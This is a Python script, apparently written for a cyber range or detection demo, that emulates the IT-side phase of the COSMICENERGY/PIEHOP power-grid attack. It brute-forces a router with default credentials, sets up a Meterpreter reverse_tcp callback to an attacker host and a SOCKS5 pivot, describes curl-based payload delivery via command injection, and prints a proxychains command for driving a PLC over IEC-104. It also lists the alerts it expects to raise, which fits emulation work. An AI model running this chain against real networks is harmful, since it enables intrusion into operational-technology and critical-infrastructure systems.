#!/usr/bin/env python3
"""
CosmicEnergy / PIEHOP+LIGHTWORK IT-Side Phase

Primary source: Mandiant (May 2023) - "COSMICENERGY: New OT Malware Targeting Electric Power"

Real kill chain:
  1. Router compromise (SSH bruteforce via Metasploit ssh_login: admin:admin)
  2. Meterpreter ELF delivered to router → reverse_tcp session
  3. MSF add_route 192.168.1.0/24 via session + SOCKS5 on :1080
  4. PIEHOP (piehop.py) tunnels through proxychains4 → router → historian MSSQL
  5. LIGHTWORK fires from historian → PLC-2 IEC-104 :2404

PIEHOP has no built-in network discovery - it requires pre-obtained MSSQL creds
and a path to the historian. The router pivot IS the access path.

This IT phase sets up the tunnel. The OT attack (piehop.py) runs via proxychains4.

Attribution: Likely Rostelecom-Solar red-team tool for "Solar Polygon" cyber range.
Not confirmed deployed in the wild. NOT attributed to Sandworm.
"""

import sys
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPT_DIR)

from router_initial_access import (
    phase1_ssh_bruteforce,
    phase1_meterpreter_pivot,
    ROUTER_IT_IP,
    ATTACKER_IP,
    ROUTER_LPORT,
    SOCKS_PORT,
)

# PIEHOP artifact identifiers (Mandiant verified)
PIEHOP_SHA256    = '358f0f8c23acea82c5f75d6a2de37b6bea7785ed0e32c41109c217c48bf16010'
LIGHTWORK_SHA256 = '740e0d2fba550308344b2fb0e5ecfebdf09329bdcfaa909d3357ad4fe5552532'

HISTORIAN_IP = '192.168.1.20'   # ICONICS Historian - on OT subnet, behind router
MSSQL_PORT   = 1433


def run_cosmicenergy_it_phase(router_ip=ROUTER_IT_IP, lhost=ATTACKER_IP,
                               historian_ip=HISTORIAN_IP):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  COSMICENERGY / PIEHOP+LIGHTWORK - IT PHASE                  ║
║  Mandiant May 2023 | Solar Polygon cyber range tool          ║
║  NOT Sandworm - attributed to Rostelecom-Solar               ║
╚══════════════════════════════════════════════════════════════╝

KILL CHAIN:
  Router SSH bruteforce → Meterpreter pivot + portfwd 127.0.0.1:1433 → 192.168.1.20:1433
  → PIEHOP (--mssql 127.0.0.1) → historian MSSQL via portfwd → LIGHTWORK → PLC-2 IEC-104

ARTIFACTS:
  PIEHOP    r3_iec104_control.exe  SHA256: 358f0f8c...
  LIGHTWORK OT_T855_IEC104_GR.exe SHA256: 740e0d2f...
""")

    # ── Step 1: SSH bruteforce router via Metasploit ──────────────────────────
    print("═══ STEP 1: SSH BRUTEFORCE - Router Initial Access ═══")
    print(f"  Module  : auxiliary/scanner/ssh/ssh_login")
    print(f"  Target  : {router_ip}:22")
    print(f"  Creds   : admin:admin (default router password)")
    print(f"  Purpose : gain shell on router - bridge between IT and OT subnets")

    ok = phase1_ssh_bruteforce(router_ip=router_ip)
    if not ok:
        print("  [-] SSH bruteforce failed - aborting IT phase")
        return False

    # ── Step 2: Meterpreter pivot → SOCKS5 tunnel ────────────────────────────
    print("\n═══ STEP 2: METERPRETER PIVOT - OT Subnet Tunnel ═══")
    print(f"  Payload : linux/x64/meterpreter/reverse_tcp → {lhost}:{ROUTER_LPORT}")
    print(f"  Delivery: curl via command injection → /tmp/.x → nohup exec")
    print(f"  Route   : add_route 192.168.1.0/24 via Meterpreter session")
    print(f"  Tunnel  : SOCKS5 127.0.0.1:{SOCKS_PORT} (proxychains4)")
    print(f"  Purpose : PIEHOP reaches historian MSSQL at {historian_ip}:{MSSQL_PORT}")
    print(f"            without direct Kali→OT subnet route")

    ok = phase1_meterpreter_pivot(
        router_ip=router_ip,
        lhost=lhost,
        router_lport=ROUTER_LPORT,
        socks_port=SOCKS_PORT,
    )
    if not ok:
        print("  [!] Meterpreter pivot incomplete - tunnel may still establish")
        print("  [!] Check msfconsole manually for session status")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"""
[+] CosmicEnergy IT phase complete

Tunnel path:
  Kali → SOCKS5 127.0.0.1:{SOCKS_PORT} → Meterpreter session (router)
       → 192.168.1.x OT subnet → {historian_ip}:{MSSQL_PORT} MSSQL

OT phase (piehop.py) runs via proxychains4:
  proxychains4 -q python3 piehop.py \\
    --mssql {historian_ip} --target 192.168.1.11 --port 2404 --duration 15

Expected XSIAM / network alerts:
  • SSH login from external → router (bruteforce, Event: SSH auth success)
  • Linux ELF delivered to router via HTTP + command injection
  • Meterpreter C2 beacon: router → Kali (reverse_tcp, persistent)
  • SOCKS5 proxy traffic: anomalous TCP tunnel from router to historian
  • MSSQL connection from non-HMI host: Kali (via proxy) → historian :1433
  • xp_cmdshell exec on historian: sqlservr.exe → python.exe → c104 IEC-104
  • IEC-104 TCP :2404 outbound from historian (anomalous source - not HMI)
  • File drop + delete: OT_T855_IEC104_GR.py in historian ProgramData (anti-forensics)
""")
    return True


def main():
    import argparse
    p = argparse.ArgumentParser(
        description='CosmicEnergy IT Phase - SSH bruteforce + Meterpreter tunnel')
    p.add_argument('--router-ip', default=ROUTER_IT_IP,
                   help=f'Router IT-side IP (default: {ROUTER_IT_IP})')
    p.add_argument('--lhost', default=ATTACKER_IP,
                   help=f'Attacker IP for Meterpreter callback (default: {ATTACKER_IP})')
    p.add_argument('--historian-ip', default=HISTORIAN_IP,
                   help=f'ICONICS historian IP (default: {HISTORIAN_IP})')
    # Demo UI passes --hmi-ip/--hmi-user/--hmi-pass to all IT phase scripts - accept and ignore
    p.add_argument('--hmi-ip',   default=None)
    p.add_argument('--hmi-user', default=None)
    p.add_argument('--hmi-pass', default=None)
    args = p.parse_args()
    run_cosmicenergy_it_phase(
        router_ip=args.router_ip,
        lhost=args.lhost,
        historian_ip=args.historian_ip,
    )


if __name__ == '__main__':
    main()
